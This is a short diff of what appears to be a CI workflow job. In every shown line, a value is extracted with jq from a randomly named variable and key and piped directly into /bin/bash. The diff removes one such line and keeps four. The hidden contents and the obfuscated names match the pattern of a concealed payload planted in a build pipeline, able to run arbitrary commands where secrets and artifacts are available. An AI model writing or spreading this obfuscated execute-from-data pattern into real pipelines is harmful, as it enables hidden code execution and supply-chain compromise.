@@ -21,7 +21,6 @@ jobs:
           echo $fhz1 | jq -r .eud829 | /bin/bash
           echo $ofor5 | jq -r .pp7 | /bin/bash
           echo $xp24208 | jq -r .z40845 | /bin/bash
-          echo $iud2080 | jq -r .eqv44914 | /bin/bash
           printf '%s' "$byh9" | jq -r .kcgkl891 | /bin/bash
 
       - name: Store artifact
